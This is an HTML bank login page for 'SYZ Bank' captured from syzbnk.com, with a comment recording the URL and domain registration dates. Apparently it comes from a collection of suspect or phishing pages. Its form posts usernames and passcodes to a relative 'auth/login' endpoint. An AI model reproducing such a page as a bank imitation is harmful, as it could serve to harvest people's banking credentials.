@@ -1,0 +1,153 @@
+<!-- URL =https://syzbnk.com/ebanking/login.php--><!-- w =(['SYZBNK.COM', 'syzbnk.com'], datetime.datetime(2020, 1, 21, 19, 10, 55), datetime.datetime(2022, 1, 21, 19, 10, 55))--><!DOCTYPE html>
+<html lang="en">
+ <!--<![endif]-->
+ <head>
+  <meta charset="utf-8"/>
+  <title>
+   SYZ Bank | Secure Login
+  </title>
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
+  <meta content="" name="description"/>
+  <meta content="" name="author"/>
+  <link href="http://www.syzbnk.com/themes/custom/syz/img/ico/favicon.ico" rel="icon" type="image/x-icon"/>
+  <link href="http://www.syzbnk.com/themes/custom/syz/img/ico/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
+  <!-- ================== BEGIN BASE CSS STYLE ================== -->
+  <link href="assets/css/jquery-ui.min.css" rel="stylesheet"/>
+  <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
+  <link href="assets/css/themify-icons.css" rel="stylesheet"/>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
+  <link href="assets/css/animate.min.css" rel="stylesheet">
+   <link href="assets/css/style.min.css" rel="stylesheet"/>
+   <!-- ================== END BASE CSS STYLE ================== -->
+   <!-- ================== END BASE JS ================== -->
+  </link>
+ </head>
+ <body class="inverse-mode" style="background-image: url(assets/img/img1.jpg); background-size:cover; background-attachment:fixed;">
+  <!-- BEGIN #page-container -->
+  <div id="page-container">
+   <!-- BEGIN login -->
+   <div class="login">
+    <b style="font-size:2.0em; color:#fff;">
+    </b>
+    <!-- BEGIN login-cover -->
+    <div class="login-cover">
+    </div>
+    <!-- END login-cover -->
+    <!-- BEGIN login-content -->
+    <div class="login-content">
+     <!-- BEGIN login-brand -->
+     <div class="login-brand text-center" style="margin-top:-120px!important">
+      <a href="#">
+       <!--<img src="assets/img/lo" height="60" width="150" style="padding: 10px 10px; ">-->
+       <img alt="site logo" src="assets/img/log.jpg" style="width:62px;height:54px"/>
+      </a>
+     </div>
+     <!-- END login-brand -->
+     <!-- BEGIN login-desc -->
+     <aside id="show-log">
+     </aside>
+     <form id="login" method="POST">
+      <div class="input-container">
+       <i class="fa fa-user icon" style="color:#fff!important">
+       </i>
+       <input class="input-field" name="username" placeholder="Username or SmartCard ID" type="text"/>
+      </div>
+      <div class="input-container">
+       <i class="fa fa-lock icon">
+       </i>
+       <input class="input-field" name="password" placeholder="Passcode" type="password"/>
+      </div>
+      <style>
+       button:hover{
+	color:none!important;
+}
+      </style>
+      <button class="btn" id="submitBtn" type="submit">
+       <span id="text">
+        Sign In
+       </span>
+       <span id="img" style="display:none;">
+        <img src="assets/img/loading.gif" style="width:15px; height:15px"/>
+        Logging in...
+       </span>
+      </button>
+     </form>
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js">
+     </script>
+     <script type="text/javascript">
+      $(document).ready(function() {	
+	// submit form using $.ajax() method
+	$('#login').submit(function(e){
+		e.preventDefault(); // Prevent Default Submission
+		 $('#text').hide();
+		 $('#img').show();
+		 $('#text2').show();
+		$.ajax({
+			url: 'auth/login',
+			type: 'POST',
+			data: $(this).serialize() // it will serialize the form data
+		})
+		.done(function(data){
+			$('#show-log').fadeOut('slow', function(){
+				$('#show-log').fadeIn('slow').html(data);
+				 $('#img').hide();
+				 $('#text').show();
+			});
+		})
+		.fail(function(){
+			alert('Logging in not Available, please contact Admin.');	
+		});
+	});
+});
+     </script>
+     <!-- END login-form -->
+     <br/>
+     <br/>
+     <br/>
+     <br/>
+     <br/>
+     <br/>
+     <footer class="">
+      <div align="center">
+       ©
+       <script>
+        document.write(new Date().getFullYear())
+       </script>
+       SYZ Bank
+      </div>
+     </footer>
+    </div>
+    <!-- END login-content -->
+   </div>
+   <!-- END login -->
+   <!-- BEGIN btn-scroll-top -->
+   <a class="btn-scroll-top fade" data-click="scroll-top" href="#">
+    <i class="ti-arrow-up">
+    </i>
+   </a>
+   <!-- END btn-scroll-top -->
+  </div>
+  <!-- END #page-container -->
+  <!-- ================== BEGIN BASE JS ================== -->
+  <script src="assets/js/jquery-1.9.1.min.js">
+  </script>
+  <script src="assets/js/jquery-migrate-1.1.0.min.js">
+  </script>
+  <script src="assets/js/jquery-ui.min.js">
+  </script>
+  <script src="assets/js/bootstrap.min.js">
+  </script>
+  <script src="assets/js/jquery.slimscroll.min.js">
+  </script>
+  <!-- ================== END BASE JS ================== -->
+  <!-- ================== BEGIN PAGE LEVEL JS ================== -->
+  <script src="assets/js/apps.min.js">
+  </script>
+  <!-- ================== END PAGE LEVEL JS ================== -->
+  <script>
+   $(document).ready(function() {
+			App.init();
+		});
+  </script>
+ </body>
+</html>
